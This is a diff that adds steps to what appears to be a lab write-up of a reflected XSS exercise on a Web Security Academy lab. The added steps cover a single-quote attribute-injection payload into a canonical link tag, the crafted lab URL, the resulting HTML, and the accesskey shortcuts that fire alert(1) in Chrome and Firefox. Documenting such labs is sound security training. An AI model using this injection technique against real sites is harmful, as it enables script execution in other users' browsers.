@@ -117,9 +117,33 @@ This confirmed successful JavaScript execution through the injected HTML attribu
 
 **Injected Payload:**
 
+```text
+?'accesskey='x'onclick='alert(1)
+```
+
 **Crafted URL:**
 
+```text
+https://0a06006903f231918112891b005000f9.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
+```
+
+**Resulting HTML Structure:**
+
+```html
+<link rel="canonical"
+      href='?'
+      accesskey='x'
+      onclick='alert(1)'/>
+```
+
+**Execution:**
+
+- Chrome: Pressed `ALT + X`.
+- Firefox: Pressed `ALT + SHIFT + X`.
+
 **Result:**
+
+Successfully triggered the injected JavaScript `alert(1)` through the assigned keyboard shortcut, confirming the Reflected XSS vulnerability via HTML attribute injection.
 
 ## 6. Impact
 
